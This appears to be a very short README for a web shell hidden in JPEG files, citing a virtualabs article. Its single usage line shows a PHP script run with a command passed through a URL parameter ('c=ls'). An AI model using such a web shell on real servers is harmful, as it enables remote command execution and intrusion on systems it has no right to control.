# How to use
b.php?c=ls


Source: http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l